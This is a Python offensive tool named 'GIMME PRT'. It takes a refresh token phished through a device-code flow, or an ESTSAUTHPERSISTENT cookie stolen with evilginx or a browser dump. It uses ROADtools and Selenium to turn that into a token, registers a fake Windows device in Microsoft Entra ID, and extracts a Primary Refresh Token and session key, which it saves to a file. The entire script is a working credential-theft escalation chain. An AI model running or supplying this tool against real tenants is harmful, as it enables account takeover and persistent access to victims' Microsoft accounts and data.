#!/usr/bin/env python3

import argparse
import sys
from datetime import datetime

try:
    from colorama import init
    from colorama import Fore
    from roadtools.roadlib.auth import Authentication  # type: ignore
    from roadtools.roadlib.deviceauth import DeviceAuthentication  # type: ignore
    from roadtools.roadtx.selenium import SeleniumAuthentication  # type: ignore

except ModuleNotFoundError:
    print("[!] Missing required libraries - run the following command:")
    print("    pip install roadtools roadtx colorama ")
    sys.exit(1)


# Init colorama to switch between Windows and Linux
if sys.platform == "win32":
    init(convert=True)


class Colors:
    """Color codes for colorized terminal output"""

    OKBLUE = Fore.BLUE
    WARNING = Fore.YELLOW
    FAIL = Fore.RED
    ENDC = Fore.RESET


def timestamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")[:-3]


def print_info(m: str) -> None:
    print(f"[{timestamp()}] {Colors.OKBLUE}info{Colors.ENDC} | {m}")


def print_debug(m: str, d: bool = False) -> None:
    if d:
        print(f"[{timestamp()}] {Colors.WARNING}debg{Colors.ENDC} | {m}")


def print_error(m: str) -> None:
    print(f"[{timestamp()}] {Colors.FAIL}fail{Colors.ENDC} | {m}")


if __name__ == "__main__":
    # Default Data
    # fmt: off
    client_id    = "29d9ed98-a469-4536-ade2-f981bc1d605e"
    resource_enr = "https://enrollment.manage.microsoft.com/"
    resource_drs = "urn:ms-drs:enterpriseregistration.windows.net"
    redirect_uri = "https://login.microsoftonline.com/applebroker/msauth"
    user_agent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    # fmt: on

    parser = argparse.ArgumentParser(description="-*- GIMME PRT -*-")
    subparsers = parser.add_subparsers(dest="action")

    # Step 1: SquarePhish/Device code token data
    refresh = subparsers.add_parser("refresh", help="Convert refresh token to PRT")
    refresh.add_argument(
        "-t",
        "--token",
        help="refresh token from SquarePhish/device code flow",
        required=True,
    )

    # Step 1: evilginx/Browser session cookie data
    cookie = subparsers.add_parser(
        "cookie", help="Convert Microsoft ESTS cookie to PRT"
    )
    cookie.add_argument(
        "--estsauth",
        help="ESTSAUTHPERSISTENT cookie from evilginx/browser dump",
        required=True,
    )

    # Step 3: Device join data
    parser.add_argument(
        "--device-name",
        help="device name when joining (default: DESKTOP-XXXXXXXX)",
        required=False,
    )
    parser.add_argument(
        "--windows-version",
        help="windows versions for the joined device (default: 10.0.19041.928)",
        required=False,
    )
    parser.add_argument(
        "--debug",
        help="enable debugging",
        action="store_true",
        required=False,
    )
    args = parser.parse_args()

    # Step 1: If handling cookie data, convert to useable refresh token
    if args.action == "cookie":
        # Via 'roadtx interactiveauth'
        # https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/main.py#L896
        print_info("Converting ESTSAUTHPERSISTENT cookie to a useable Refresh Token")

        # Initialize temporary ROADlib authentication
        auth = Authentication()
        deviceauth = DeviceAuthentication(auth)

        print_debug(f"Client ID:    {client_id}", args.debug)
        print_debug(f"Resource:     {resource_enr}", args.debug)
        print_debug(f"Redirect URL: {redirect_uri}", args.debug)
        print_debug(f"User-Agent:   {user_agent}", args.debug)

        # Set the authentication baseline
        auth.set_client_id(client_id)
        auth.set_resource_uri(resource_enr)
        auth.set_user_agent(user_agent)

        # Establish the Selenium driver config
        selauth = SeleniumAuthentication(auth, deviceauth, redirect_uri)
        url = auth.build_auth_url(redirect_uri, "code", ".default")
        service = selauth.get_service("./geckodriver")  # TODO
        if not service:
            print_error("Failed to create Selenium service")
            sys.exit(1)

        # Perform authentication with the ESTS cookie and get the token
        # in return
        selauth.driver = selauth.get_webdriver(service, intercept=True)
        res = selauth.selenium_login_with_estscookie(
            url,
            None,  # Username
            None,  # Password
            capture=False,
            estscookie=args.estsauth,
            keep=False,
        )
        if not res:
            print_error("Failed to convert cookie into a useable refresh token")
            sys.exit(1)

        print_info("Successfully converted cookie to refresh token")
        args.token = res["refreshToken"]
        del auth
        del deviceauth

        input("Press enter to continue...")  # DEBUG

    # Step 2: Convert refresh token to the correct resource
    # Initialize ROADlib authentication
    print_info("Swapping refresh token to the correct resource URI")
    auth = Authentication()

    auth.refresh_token = args.token
    auth.set_client_id(client_id)
    auth.set_resource_uri(resource_drs)
    auth.set_user_agent(user_agent)

    res = auth.get_tokens(args=None)
    if not res:
        print_error("Failed to get refresh token with the correct resource")
        sys.exit(1)

    else:
        print_info("Successfully swapped token resource URI")
        auth.access_token = res["accessToken"]
        auth.refresh_token = res["refreshToken"]

    input("Press enter to continue...")  # DEBUG

    # Step 3: Join a new device
    # Join     -> 0
    # Register -> 4
    print_info("Joining device:")
    crt_file = "device.pem"
    key_file = "device.key"

    deviceauth = DeviceAuthentication(auth)
    deviceauth.register_device(
        access_token=auth.access_token,
        jointype=0,
        certout=crt_file,
        privout=key_file,
        device_type="Windows",
        device_name=args.device_name,
        os_version=args.windows_version,
        deviceticket=None,
    )

    input("Press enter to continue...")  # DEBUG

    # Step 4: Request PRT with the newly joined device
    if not deviceauth.loadcert(crt_file, key_file, None, None, None):
        print_error("Invalid device certificate and key files")
        sys.exit(1)

    prtdata = deviceauth.get_prt_with_refresh_token(auth.refresh_token)
    if not prtdata:
        print_error("Failed to retrieve PRT")
        sys.exit(1)

    print_info(f"Obtained PRT:\n{prtdata['refresh_token']}")
    print_info(f"Obtained session key: {prtdata['session_key']}")
    deviceauth.saveprt(prtdata, "prt.txt")

    print_info("Cleaning up device join")
    deviceauth.delete_device(crt_file, key_file)
